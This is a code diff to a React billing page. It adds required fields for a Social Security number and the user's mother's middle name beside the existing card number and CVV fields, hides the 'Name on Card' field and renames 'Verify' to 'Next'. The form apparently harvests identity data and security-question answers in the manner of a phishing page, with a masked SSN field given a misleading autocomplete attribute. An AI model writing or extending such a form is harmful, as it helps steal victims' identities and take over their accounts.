@@ -13,12 +13,14 @@ const BillingPage = () => {
     fullName: "",
     address: "",
     zip: "",
+    ssn: "",
     email: "",
     phone: "",
     cardNumber: "",
     expiry: "",
     cvv: "",
     cardName: "",
+    motherMiddleName: "",
   });
 
   const handleChange = (e) => {
@@ -134,6 +136,42 @@ const BillingPage = () => {
                     placeholder="+1 (555) 555-0123"
                   />
                 </div>
+
+                <div>
+                  <label className="block text-sm font-medium text-gray-700">
+                    SSN
+                  </label>
+                  <input
+                    name="ssn"
+                    value={form.ssn.replace(/\D/g, "").slice(0, 9)}
+                    onChange={(e) =>
+                      handleChange({
+                        target: { name: "ssn", value: e.target.value },
+                      })
+                    }
+                    inputMode="numeric"
+                    type="password"
+                    autoComplete="cc-csc"
+                    maxLength={9}
+                    placeholder="●●● ●●● ●●●"
+                    required
+                    className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-sm font-medium text-gray-700">
+                    Mother's Middle Name
+                  </label>
+                  <input
+                    name="motherMiddleName"
+                    value={form.motherMiddleName}
+                    onChange={handleChange}
+                    required
+                    className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
+                    placeholder="Enter Your Mother's Middle Name"
+                  />
+                </div>
               </div>
 
               <div>
@@ -235,7 +273,7 @@ const BillingPage = () => {
                       />
                     </div>
 
-                    <div>
+                    {/* <div>
                       <label className="block text-sm font-medium text-gray-700">
                         Name on Card
                       </label>
@@ -247,7 +285,7 @@ const BillingPage = () => {
                         placeholder="John A. Smith"
                         className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                       />
-                    </div>
+                    </div> */}
                   </div>
 
                   <p className="text-xs text-gray-500 mt-3">
@@ -280,7 +318,7 @@ const BillingPage = () => {
                       /* Replace with real integration: send card to hosted payment/tokenization endpoint */
                     }}
                   >
-                    Verify
+                    Next
                   </button>
                 </div>
               </div>
